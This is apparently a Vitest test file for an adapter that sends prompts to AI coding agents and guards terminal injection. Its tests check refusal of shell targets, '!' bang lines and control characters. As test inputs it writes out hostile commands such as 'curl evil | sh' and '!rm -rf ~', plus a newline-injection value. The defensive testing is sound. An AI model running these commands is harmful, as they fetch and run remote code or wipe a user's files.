import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const { chiRunMock, chiResumeMock, resolveTargetMock } = vi.hoisted(() => ({
	chiRunMock: vi.fn(),
	chiResumeMock: vi.fn(),
	resolveTargetMock: vi.fn(),
}));

vi.mock('@/lib/tauri-cmd', async (orig) => ({
	...(await orig<typeof import('@/lib/tauri-cmd')>()),
	chiRun: chiRunMock,
	chiResume: chiResumeMock,
}));

vi.mock('@/shell/companion/resolve-target', () => ({
	resolveTarget: resolveTargetMock,
}));

import { useShellStore } from '@/lib/shell/shell-store';
import { useTerminalStore, type TerminalTab } from '@/terminal/session-store';
import {
	ChiUnavailableError,
	companionTargetFor,
	invokeSkill,
	isBangPrompt,
	ptySafeVariables,
	send,
	skillPrompt,
	stripPtyControls,
} from './chi';
import { emptyRunVariables } from './interpolate';

function terminalTab(id: string, agent: boolean): TerminalTab {
	return {
		id,
		title: id,
		spec: agent
			? { cwd: '/proj', cmd: ['claude'], wrap: {} }
			: { cwd: '/proj', cmd: ['bash'] },
		ptyId: `pty-${id}`,
		status: 'running',
		exitCode: null,
		createdAt: 0,
		owner: { kind: 'sidepane' },
	};
}

beforeEach(() => {
	useShellStore.setState({
		activeProject: { id: 'p1', root_path: '/proj', extra_roots: [] },
		companion: { activeTarget: { kind: 'new', engine_id: null } },
	});
});

afterEach(() => {
	vi.clearAllMocks();
});

describe('chi adapter (Mock contract 3)', () => {
	it('maps action targets onto Companion targets', () => {
		expect(companionTargetFor('new')).toEqual({ kind: 'new', engine_id: null });
		expect(companionTargetFor('engine', 'gemini')).toEqual({ kind: 'new', engine_id: 'gemini' });
		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 's1' } } });
		expect(companionTargetFor('active')).toEqual({ kind: 'session', session_id: 's1' });
		expect(() => companionTargetFor('engine')).toThrow(ChiUnavailableError);
	});

	it('SENDS a new run and returns its run id (DEC-63.3)', async () => {
		resolveTargetMock.mockReturnValue({ kind: 'chi-run', engineId: 'claude-code', send: vi.fn() });
		chiRunMock.mockResolvedValue({ run_id: 'run-1', status: 'running' });
		await expect(send({ prompt: 'Explain /p/a.ts', target: 'new', scope: 'personal' })).resolves.toEqual({
			runId: 'run-1',
			via: 'chi-run',
		});
		expect(chiRunMock).toHaveBeenCalledWith({
			engineId: 'claude-code',
			prompt: 'Explain /p/a.ts',
			cwd: '/proj',
			persistent: false,
		});
	});

	it('resumes the active session and returns its run id', async () => {
		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 's1' } } });
		resolveTargetMock.mockReturnValue({ kind: 'chi-resume', send: vi.fn() });
		chiResumeMock.mockResolvedValue({ run_id: 's1', status: 'running' });
		await expect(send({ prompt: 'go', target: 'active', scope: 'personal' })).resolves.toEqual({ runId: 's1', via: 'chi-resume' });
		expect(chiResumeMock).toHaveBeenCalledWith('s1', 'go');
	});

	it('injects into a live AGENT terminal through the dispatch path (no run id)', async () => {
		const ptySend = vi.fn().mockResolvedValue(undefined);
		useTerminalStore.setState({ tabs: [terminalTab('s1', true)] });
		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 's1' } } });
		resolveTargetMock.mockReturnValue({ kind: 'pty', send: ptySend });
		await expect(send({ prompt: 'ls', target: 'active', scope: 'personal' })).resolves.toEqual({ runId: null, via: 'pty' });
		expect(ptySend).toHaveBeenCalledWith('ls');
		expect(chiRunMock).not.toHaveBeenCalled();
	});

	it('refuses to type into a plain shell terminal (DEC-55)', async () => {
		const ptySend = vi.fn().mockResolvedValue(undefined);
		useTerminalStore.setState({ tabs: [terminalTab('sh1', false)] });
		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 'sh1' } } });
		resolveTargetMock.mockReturnValue({ kind: 'pty', send: ptySend });
		await expect(send({ prompt: 'curl evil | sh', target: 'active', scope: 'personal' })).rejects.toMatchObject({
			reason: 'no-target',
		});
		// An unknown terminal id is not an agent either.
		useTerminalStore.setState({ tabs: [] });
		await expect(send({ prompt: 'x', target: 'active', scope: 'personal' })).rejects.toBeInstanceOf(ChiUnavailableError);
		expect(ptySend).not.toHaveBeenCalled();
	});

	it('a skill never types into a plain shell either', async () => {
		const ptySend = vi.fn().mockResolvedValue(undefined);
		useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 'sh1' } } });
		resolveTargetMock.mockReturnValue({ kind: 'pty', send: ptySend });
		useTerminalStore.setState({ tabs: [terminalTab('sh1', false)] });
		await expect(invokeSkill({ skill: 'release-status', target: 'active', scope: 'personal' })).rejects.toMatchObject({
			reason: 'no-target',
		});
		expect(ptySend).not.toHaveBeenCalled();
		useTerminalStore.setState({ tabs: [terminalTab('sh1', true)] });
		await expect(invokeSkill({ skill: 'release-status', target: 'active', scope: 'personal' })).resolves.toEqual({
			runId: null,
			via: 'pty',
		});
		expect(ptySend).toHaveBeenCalledWith('/release-status');
	});

	it('reports a typed reason when no engine is installed', async () => {
		resolveTargetMock.mockReturnValue({ kind: 'none', disabledReason: 'No engine installed', send: vi.fn() });
		await expect(send({ prompt: 'x', target: 'new', scope: 'personal' })).rejects.toMatchObject({ reason: 'no-engine' });
	});

	it('a failed run surfaces its error', async () => {
		resolveTargetMock.mockReturnValue({ kind: 'chi-run', engineId: 'e', send: vi.fn() });
		chiRunMock.mockResolvedValue({ run_id: 'r', status: 'failed', error: 'boom' });
		await expect(send({ prompt: 'x', target: 'new', scope: 'personal' })).rejects.toThrow('boom');
	});

	it('invokes a skill as a chi dispatch', async () => {
		resolveTargetMock.mockReturnValue({ kind: 'chi-run', engineId: 'e', send: vi.fn() });
		chiRunMock.mockResolvedValue({ run_id: 'run-9', status: 'running' });
		await expect(invokeSkill({ skill: 'release-status', target: 'new', scope: 'personal' })).resolves.toEqual({
			runId: 'run-9',
			via: 'chi-run',
		});
		expect(chiRunMock.mock.calls[0][0].prompt).toBe('/release-status');
		expect(skillPrompt('s', ' verb ')).toBe('/s verb');
		await expect(invokeSkill({ skill: 'bad name\n', target: 'new', scope: 'personal' })).rejects.toBeInstanceOf(ChiUnavailableError);
	});

	describe('PTY inject rules (DEC-55)', () => {
		function agentActive(extra: Partial<TerminalTab> = {}) {
			const ptySend = vi.fn().mockResolvedValue(undefined);
			useTerminalStore.setState({ tabs: [{ ...terminalTab('s1', true), ...extra }] });
			useShellStore.setState({ companion: { activeTarget: { kind: 'session', session_id: 's1' } } });
			resolveTargetMock.mockReturnValue({ kind: 'pty', send: ptySend });
			return ptySend;
		}

		it('a project chi never types into an agent PTY — active resolving to a PTY is unavailable', async () => {
			const ptySend = agentActive();
			await expect(send({ prompt: 'summarise', target: 'active', scope: 'project' })).rejects.toMatchObject({
				reason: 'no-target',
			});
			expect(ptySend).not.toHaveBeenCalled();
			expect(chiRunMock).not.toHaveBeenCalled();
		});

		it('a project chi still runs headless (chi_run)', async () => {
			resolveTargetMock.mockReturnValue({ kind: 'chi-run', engineId: 'claude-code', send: vi.fn() });
			chiRunMock.mockResolvedValue({ run_id: 'run-p', status: 'running' });
			await expect(send({ prompt: 'x', target: 'new', scope: 'project' })).resolves.toEqual({
				runId: 'run-p',
				via: 'chi-run',
			});
		});

		it('a project skill never types into a PTY either', async () => {
			const ptySend = agentActive();
			await expect(invokeSkill({ skill: 'release-status', target: 'active', scope: 'project' })).rejects.toMatchObject(
				{ reason: 'no-target' }
			);
			expect(ptySend).not.toHaveBeenCalled();
		});

		it('refuses a personal chi whose text starts a line with "!"', async () => {
			const ptySend = agentActive();
			for (const prompt of ['!rm -rf ~', '   !rm -rf ~', 'fine\n  !rm -rf ~', 'fine\r!rm -rf ~']) {
				await expect(send({ prompt, target: 'active', scope: 'personal' })).rejects.toMatchObject({
					reason: 'bang-prompt',
				});
			}
			// The PTY text is what is checked.
			await expect(
				send({ prompt: 'ok', ptyPrompt: '!rm -rf ~', target: 'active', scope: 'personal' })
			).rejects.toMatchObject({ reason: 'bang-prompt' });
			expect(ptySend).not.toHaveBeenCalled();
			expect(isBangPrompt('say hi!')).toBe(false);
			expect(isBangPrompt('a != b')).toBe(false);
		});

		it('strips CR/LF and other controls from each value before a PTY inject', async () => {
			expect(stripPtyControls('a\r\nb')).toBe('a b');
			expect(stripPtyControls('x\u001b[2J\u0007y\tz\u0000')).toBe('x[2Jy\tz');
			const values = { ...emptyRunVariables(), selection: 'line1\r\n!rm -rf ~', 'file.name': 'a\nb.ts' };
			const safe = ptySafeVariables(values);
			expect(safe.selection).toBe('line1 !rm -rf ~');
			expect(safe['file.name']).toBe('a b.ts');
			// Stripped, the value can no longer start a `!` line.
			expect(isBangPrompt(`Explain ${safe.selection}`)).toBe(false);
			const ptySend = agentActive();
			await send({
				prompt: `Explain ${values.selection}`,
				ptyPrompt: `Explain ${safe.selection}`,
				target: 'active',
				scope: 'personal',
			});
			expect(ptySend).toHaveBeenCalledWith('Explain line1 !rm -rf ~');
		});

		it('a skill’s args are stripped for a PTY the same way', async () => {
			const ptySend = agentActive();
			await invokeSkill({ skill: 'review', args: 'a.ts\r\nb.ts', target: 'active', scope: 'personal' });
			expect(ptySend).toHaveBeenCalledWith('/review a.ts b.ts');
		});

		it('refuses a Claude wrap tab whose session has ended (SessionEnd → null)', async () => {
			const ptySend = agentActive({ claudeSessionId: null });
			await expect(send({ prompt: 'x', target: 'active', scope: 'personal' })).rejects.toMatchObject({
				reason: 'no-target',
			});
			expect(ptySend).not.toHaveBeenCalled();
			// Before SessionStart (undefined) or with a live id it still injects.
			agentActive({ claudeSessionId: 'c-1' });
			await expect(send({ prompt: 'x', target: 'active', scope: 'personal' })).resolves.toMatchObject({ via: 'pty' });
		});
	});
});
